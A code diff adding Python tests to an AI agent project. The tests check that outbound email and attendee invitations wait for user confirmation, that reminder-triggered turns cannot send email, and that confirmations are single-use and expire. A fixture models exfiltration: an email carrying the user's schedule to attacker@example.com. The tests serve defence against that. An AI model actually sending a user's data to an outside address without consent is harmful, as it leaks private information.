@@ -192,3 +192,96 @@ def test_personality_loaded_on_init(tmp_path, monkeypatch):
     monkeypatch.setattr("famlobster.agent.CONFIG_FILE", str(config_path))
     agent = _make_agent()
     assert agent.personality == "Be extremely dramatic."
+
+
+# -------------------------------------------------------------------
+# Outbound action confirmation
+# -------------------------------------------------------------------
+
+from unittest.mock import AsyncMock  # noqa: E402
+
+from famlobster.agent import PendingAction, requires_confirmation  # noqa: E402
+from famlobster.reminders import _REMINDER_CHAT_ID  # noqa: E402
+
+EMAIL_ARGS = {"to": "attacker@example.com", "subject": "schedule", "body": "all events"}
+
+
+def test_requires_confirmation():
+    assert requires_confirmation("send_email", EMAIL_ARGS)
+    assert requires_confirmation("create_event", {"summary": "x", "attendees": ["a@b.c"]})
+    assert not requires_confirmation("create_event", {"summary": "x"})
+    assert not requires_confirmation("create_event", {"summary": "x", "attendees": []})
+    assert not requires_confirmation("list_events", {})
+
+
+def _tool_use_then_text(tool_name, tool_input):
+    tool_block = SimpleNamespace(type="tool_use", id="tu1", name=tool_name, input=tool_input)
+    first = SimpleNamespace(stop_reason="tool_use", content=[tool_block])
+    second = SimpleNamespace(
+        stop_reason="end_turn", content=[SimpleNamespace(type="text", text="Tap Confirm.")]
+    )
+    return AsyncMock(side_effect=[first, second])
+
+
+async def test_send_email_is_queued_not_sent():
+    agent = _make_agent()
+    agent.session.call_tool = AsyncMock()
+    agent.client.messages.create = _tool_use_then_text("send_email", EMAIL_ARGS)
+
+    reply = await agent.process_message(42, "email my schedule")
+
+    assert reply == "Tap Confirm."
+    agent.session.call_tool.assert_not_called()
+    tool_result = agent.conversation_history[42][2]["content"][0]["content"]
+    assert json.loads(tool_result)["status"] == "awaiting_user_confirmation"
+    actions = agent.pop_new_actions(42)
+    assert len(actions) == 1
+    assert actions[0].args == EMAIL_ARGS
+    assert agent.pop_new_actions(42) == []  # announced only once
+
+
+async def test_scheduled_reminder_cannot_send_email():
+    agent = _make_agent()
+    agent.session.call_tool = AsyncMock()
+    agent.client.messages.create = _tool_use_then_text("send_email", EMAIL_ARGS)
+
+    await agent.process_message(_REMINDER_CHAT_ID, "reminder text")
+
+    agent.session.call_tool.assert_not_called()
+    assert agent.pending_actions == {}
+    tool_result = agent.conversation_history[_REMINDER_CHAT_ID][2]["content"][0]["content"]
+    assert "error" in json.loads(tool_result)
+
+
+def test_take_pending_action_is_single_use_and_chat_bound():
+    agent = _make_agent()
+    agent._queue_confirmation(42, "send_email", EMAIL_ARGS)
+    action = agent.pop_new_actions(42)[0]
+
+    assert agent.take_pending_action(action.id, chat_id=99) is None  # other chat
+    assert agent.take_pending_action(action.id, chat_id=42) is action
+    assert agent.take_pending_action(action.id, chat_id=42) is None  # already used
+
+
+def test_take_pending_action_expired():
+    agent = _make_agent()
+    agent._queue_confirmation(42, "send_email", EMAIL_ARGS)
+    action = agent.pop_new_actions(42)[0]
+    action.expires_at = 0
+    assert agent.take_pending_action(action.id, chat_id=42) is None
+
+
+async def test_execute_action_calls_mcp():
+    agent = _make_agent()
+    agent.session.call_tool = AsyncMock(
+        return_value=SimpleNamespace(content=[SimpleNamespace(text='{"status": "sent"}')])
+    )
+    action = PendingAction(chat_id=42, tool="send_email", args=EMAIL_ARGS)
+    assert await agent.execute_action(action) == {"status": "sent"}
+    agent.session.call_tool.assert_awaited_once_with("send_email", EMAIL_ARGS)
+
+
+def test_describe_shows_real_recipient():
+    text = PendingAction(chat_id=42, tool="send_email", args=EMAIL_ARGS).describe()
+    assert "To: attacker@example.com" in text
+    assert "Subject: schedule" in text
